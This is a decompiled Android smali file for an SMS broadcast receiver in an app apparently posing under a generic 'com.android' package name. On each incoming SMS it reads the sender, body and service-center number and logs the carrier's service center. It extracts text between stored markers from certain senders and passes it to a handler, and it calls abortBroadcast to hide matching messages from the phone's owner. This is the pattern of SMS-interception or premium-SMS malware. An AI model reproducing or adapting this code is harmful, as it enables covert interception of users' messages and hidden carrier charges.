.class public Lcom/android/MainService$SMSReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MainService.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/android/MainService;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x1
    name = "SMSReceiver"
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/MainService;


# direct methods
.method public constructor <init>(Lcom/android/MainService;)V
    .locals 0
    .parameter

    .prologue
    .line 678
    iput-object p1, p0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 23
    .parameter "context"
    .parameter "intent"

    .prologue
    .line 681
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object v3

    .line 682
    .local v3, actionName:Ljava/lang/String;
    invoke-virtual/range {p0 .. p0}, Lcom/android/MainService$SMSReceiver;->getResultCode()I

    move-result v14

    .line 683
    .local v14, resultCode:I
    const-string v21, "com.test.sms.send"

    move-object v0, v3

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-eqz v21, :cond_1

    .line 757
    .end local p1
    :cond_0
    :goto_0
    return-void

    .line 687
    .restart local p1
    :cond_1
    const-string v21, "com.test.sms.delivery"

    move-object v0, v3

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_0

    .line 691
    const-string v21, "android.provider.Telephony.SMS_RECEIVED"

    move-object v0, v3

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-eqz v21, :cond_0

    .line 692
    invoke-virtual/range {p2 .. p2}, Landroid/content/Intent;->getExtras()Landroid/os/Bundle;

    move-result-object v4

    .line 693
    .local v4, bundle:Landroid/os/Bundle;
    if-eqz v4, :cond_0

    .line 694
    const-string v21, "pdus"

    move-object v0, v4

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Landroid/os/Bundle;->get(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v12

    check-cast v12, [Ljava/lang/Object;

    .line 695
    .local v12, myOBJpdus:[Ljava/lang/Object;
    move-object v0, v12

    array-length v0, v0

    move/from16 v21, v0

    move/from16 v0, v21

    new-array v0, v0, [Landroid/telephony/gsm/SmsMessage;

    move-object v11, v0

    .line 696
    .local v11, messages:[Landroid/telephony/gsm/SmsMessage;
    const/4 v7, 0x0

    .end local p1
    .local v7, i:I
    :goto_1
    move-object v0, v12

    array-length v0, v0

    move/from16 v21, v0

    move v0, v7

    move/from16 v1, v21

    if-lt v0, v1, :cond_6

    .line 700
    const/16 v21, 0x0

    aget-object v10, v11, v21

    .line 701
    .local v10, message:Landroid/telephony/gsm/SmsMessage;
    invoke-virtual {v10}, Landroid/telephony/gsm/SmsMessage;->getServiceCenterAddress()Ljava/lang/String;

    move-result-object v20

    .line 702
    .local v20, tmpservicecenter:Ljava/lang/String;
    invoke-virtual {v10}, Landroid/telephony/gsm/SmsMessage;->getDisplayOriginatingAddress()Ljava/lang/String;

    move-result-object v15

    .line 703
    .local v15, showAddress:Ljava/lang/String;
    invoke-virtual {v10}, Landroid/telephony/gsm/SmsMessage;->getDisplayMessageBody()Ljava/lang/String;

    move-result-object v16

    .line 705
    .local v16, showContent:Ljava/lang/String;
    if-eqz v15, :cond_3

    const-string v21, "100"

    move-object v0, v15

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_3

    .line 706
    const-string v21, ""

    move-object/from16 v0, v21

    move-object/from16 v1, v20

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-nez v21, :cond_3

    .line 707
    const-string v21, "other"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$1(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_3

    .line 708
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    move-object/from16 v1, v20

    invoke-static {v0, v1}, Lcom/android/MainService;->access$2(Lcom/android/MainService;Ljava/lang/String;)V

    .line 709
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$3(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    invoke-static/range {v21 .. v21}, Lcom/android/FileAct;->readString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v13

    .line 710
    .local v13, record:Ljava/lang/String;
    invoke-static {v13}, Lcom/android/StringUtil;->getRecordInfo(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v5

    .line 711
    .local v5, docount:[Ljava/lang/String;
    if-eqz v5, :cond_7

    move-object v0, v5

    array-length v0, v0

    move/from16 v21, v0

    const/16 v22, 0x3

    move/from16 v0, v21

    move/from16 v1, v22

    if-ne v0, v1, :cond_7

    .line 712
    const/16 v21, 0x2

    aget-object v18, v5, v21

    .line 713
    .local v18, smsc:Ljava/lang/String;
    const-string v21, "other"

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-nez v21, :cond_2

    .line 714
    const-string v21, ""

    move-object/from16 v0, v21

    move-object/from16 v1, v18

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_3

    .line 715
    :cond_2
    new-instance v21, Ljava/lang/StringBuilder;

    const/16 v22, 0x0

    aget-object v22, v5, v22

    invoke-static/range {v22 .. v22}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, "|"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const/16 v22, 0x1

    aget-object v22, v5, v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    .line 716
    const-string v22, "|"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$1(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    .line 715
    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 717
    .local v9, logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$3(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object v0, v9

    move-object/from16 v1, v21

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    .line 726
    .end local v5           #docount:[Ljava/lang/String;
    .end local v9           #logtxt:Ljava/lang/String;
    .end local v13           #record:Ljava/lang/String;
    .end local v18           #smsc:Ljava/lang/String;
    :cond_3
    :goto_2
    if-eqz v15, :cond_4

    const-string v21, ""

    move-object/from16 v0, v21

    move-object v1, v15

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_4

    .line 727
    if-eqz v16, :cond_4

    const-string v21, ""

    move-object/from16 v0, v21

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_4

    .line 728
    const-string v21, "1"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$5(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-eqz v21, :cond_4

    .line 729
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    const/16 v22, -0x2d

    move-object/from16 v0, v21

    move/from16 v1, v22

    move-object/from16 v2, v16

    invoke-static {v0, v1, v2}, Lcom/android/MainService;->access$6(Lcom/android/MainService;ILjava/lang/String;)I

    .line 730
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$7(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object v0, v15

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v21

    if-eqz v21, :cond_4

    .line 731
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$8(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v16

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v21

    const/16 v22, -0x1

    move/from16 v0, v21

    move/from16 v1, v22

    if-le v0, v1, :cond_4

    .line 732
    const-string v21, "1"

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$5(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-eqz v21, :cond_4

    .line 735
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$9(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v16

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v19

    .line 736
    .local v19, start:I
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$10(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v16

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v6

    .line 737
    .local v6, end:I
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$9(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    invoke-virtual/range {v21 .. v21}, Ljava/lang/String;->length()I

    move-result v8

    .line 738
    .local v8, len:I
    add-int v21, v19, v8

    move/from16 v0, v21

    move v1, v6

    if-ge v0, v1, :cond_4

    .line 740
    add-int v21, v19, v8

    .line 739
    move-object/from16 v0, v16

    move/from16 v1, v21

    move v2, v6

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v17

    .line 741
    .local v17, smsBody:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    move-object/from16 v0, v21

    move-object v1, v15

    move-object/from16 v2, v17

    invoke-static {v0, v1, v2}, Lcom/android/MainService;->access$11(Lcom/android/MainService;Ljava/lang/String;Ljava/lang/String;)V

    .line 747
    .end local v6           #end:I
    .end local v8           #len:I
    .end local v17           #smsBody:Ljava/lang/String;
    .end local v19           #start:I
    :cond_4
    if-eqz v15, :cond_0

    .line 748
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$12(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object v0, v15

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v21

    if-nez v21, :cond_5

    const-string v21, ""

    .line 749
    move-object/from16 v0, v21

    move-object/from16 v1, v16

    invoke-virtual {v0, v1}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_0

    .line 750
    const-string v21, ""

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$13(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v21

    if-nez v21, :cond_0

    .line 751
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$13(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object/from16 v0, v16

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v21

    const/16 v22, -0x1

    move/from16 v0, v21

    move/from16 v1, v22

    if-le v0, v1, :cond_0

    .line 752
    :cond_5
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$14(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object v0, v15

    move-object/from16 v1, v21

    invoke-virtual {v0, v1}, Ljava/lang/String;->equalsIgnoreCase(Ljava/lang/String;)Z

    move-result v21

    if-nez v21, :cond_0

    .line 753
    invoke-virtual/range {p0 .. p0}, Lcom/android/MainService$SMSReceiver;->abortBroadcast()V

    goto/16 :goto_0

    .line 698
    .end local v10           #message:Landroid/telephony/gsm/SmsMessage;
    .end local v15           #showAddress:Ljava/lang/String;
    .end local v16           #showContent:Ljava/lang/String;
    .end local v20           #tmpservicecenter:Ljava/lang/String;
    :cond_6
    aget-object p1, v12, v7

    check-cast p1, [B

    invoke-static/range {p1 .. p1}, Landroid/telephony/gsm/SmsMessage;->createFromPdu([B)Landroid/telephony/gsm/SmsMessage;

    move-result-object v21

    .line 697
    aput-object v21, v11, v7

    .line 696
    add-int/lit8 v7, v7, 0x1

    goto/16 :goto_1

    .line 720
    .restart local v5       #docount:[Ljava/lang/String;
    .restart local v10       #message:Landroid/telephony/gsm/SmsMessage;
    .restart local v13       #record:Ljava/lang/String;
    .restart local v15       #showAddress:Ljava/lang/String;
    .restart local v16       #showContent:Ljava/lang/String;
    .restart local v20       #tmpservicecenter:Ljava/lang/String;
    :cond_7
    new-instance v21, Ljava/lang/StringBuilder;

    invoke-static {}, Lcom/android/StringUtil;->getExecTime()Ljava/lang/String;

    move-result-object v22

    invoke-static/range {v22 .. v22}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v22

    invoke-direct/range {v21 .. v22}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v22, "|"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    .line 721
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$4(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    const-string v22, "|"

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v22, v0

    invoke-static/range {v22 .. v22}, Lcom/android/MainService;->access$1(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v22

    invoke-virtual/range {v21 .. v22}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v21

    .line 720
    invoke-virtual/range {v21 .. v21}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v9

    .line 722
    .restart local v9       #logtxt:Ljava/lang/String;
    move-object/from16 v0, p0

    iget-object v0, v0, Lcom/android/MainService$SMSReceiver;->this$0:Lcom/android/MainService;

    move-object/from16 v21, v0

    invoke-static/range {v21 .. v21}, Lcom/android/MainService;->access$3(Lcom/android/MainService;)Ljava/lang/String;

    move-result-object v21

    move-object v0, v9

    move-object/from16 v1, v21

    invoke-static {v0, v1}, Lcom/android/FileAct;->writeString(Ljava/lang/String;Ljava/lang/String;)V

    goto/16 :goto_2
.end method
